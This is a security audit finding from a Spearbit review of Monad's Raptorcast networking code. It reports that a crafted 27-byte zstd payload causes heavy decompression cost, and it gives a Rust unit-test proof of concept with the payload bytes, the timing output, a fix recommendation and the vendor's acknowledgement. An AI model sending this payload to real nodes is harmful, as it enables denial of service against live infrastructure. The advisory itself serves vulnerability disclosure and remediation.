---
tags:
  - lang/rust
  - platform/spearbit
  - has/github
  - has/poc
  - severity/high
  - sector/infra
protocol: "[[Monad]]"
auditors:
  - "[[Haxatron]]"
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/Monad-Spearbit-Security-Review-September-2025.pdf"
genome:
  - "[[boundary]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
---
# Raptorcast deserialization susceptible to zstd decompression bomb

- id: 62886
- impact: HIGH
- protocol: [[Monad]]
- reporter: Haxatron (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/Monad-Spearbit-Security-Review-September-2025.pdf

## Summary


This bug report describes a high-risk issue in the Raptorcast deserialization function. When a specific input is provided, it can cause a significant amount of processing time, up to 0.5-1 second per 27 bytes of payload. This bug has been tested and confirmed on an AMD EPYC 9454P 48-Core Processor. The report recommends using bulk decompression instead of streaming decompression to avoid this issue. This bug has been acknowledged and there is an internal issue to track it.

## Details

## Severity: High Risk
## Context
zstd.rs#L45

## Description
Deserialization of a (small) crafted input to Raptorcast's deserialization function can incur a high computational cost; approximately 0.5-1 second of processing time per 27 bytes of payload on modern hardware.

## Proof of Concept
```diff
diff --git a/monad-raptorcast/src/message.rs b/monad-raptorcast/src/message.rs
index 205c0a49..24b3906c 100644
--- a/monad-raptorcast/src/message.rs
+++ b/monad-raptorcast/src/message.rs
@@ -256,6 +256,7 @@ impl<M: Decodable, ST: CertificateSignatureRecoverable> InboundRouterMessage<M,
 mod tests {
 use bytes::BytesMut;
 use monad_secp::SecpSignature;
+ use std::time::{Duration, Instant};
 use rstest::*;
 use super::*;
@@ -443,4 +444,20 @@ mod tests {
 _ => panic!("expected AppMessage variant"),
 }
 }
+
+ #[test]
+ fn test_deserialization_decompression_bomb() {
+ let serialized = Bytes::from(&[
+ 0xda, 0xc2, 0x5d, 0x02, 0x01, 0x23, 0x94, 0x28, 0xb5, 0x2f, 0xfd, 0x14,
+ 0x88, 0x5d, 0x00, 0x00, 0xdd, 0xf9, 0x1f, 0x06, 0xfd, 0x40, 0x14, 0x02,
+ 0x30, 0x07, 0x4f
+ ][..]);
+
+ let start = Instant::now();
+ for _i in 1..100 {
+ let _ = InboundRouterMessage::<TestMessage, SecpSignature>::try_deserialize(&serialized);
+ }
+ let duration = start.elapsed();
+ assert!(duration < Duration::from_secs(1), "Operation took too long: {:?}", duration);
+ }
 }
```
## Output
```
running 1 test
test message::tests::test_deserialization_decompression_bomb ... FAILED
failures:
---- message::tests::test_deserialization_decompression_bomb stdout -
---
thread 'message::tests::test_deserialization_decompression_bomb' panicked at
monad-raptorcast/src/message.rs:461:9:↪→
Operation took too long: 23.343895969s
note: run with RUST_BACKTRACE=1 environment variable to display a backtrace
failures:
message::tests::test_deserialization_decompression_bomb
test result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 41 filtered out; finished in 23.34s
```
Tested on "AMD EPYC 9454P 48-Core Processor".

## Recommendation
The zstd decompressor (zstd.rs#L45) uses streaming decompression. Use bulk decompression instead, as this mode has a much lower worst case complexity.

## Category Labs
Acknowledged. ZSTD was intentionally disabled for mainnet launch to avoid running into this issue in PR 2184, and there is an internal issue to track this.

## Spearbit
Acknowledged.
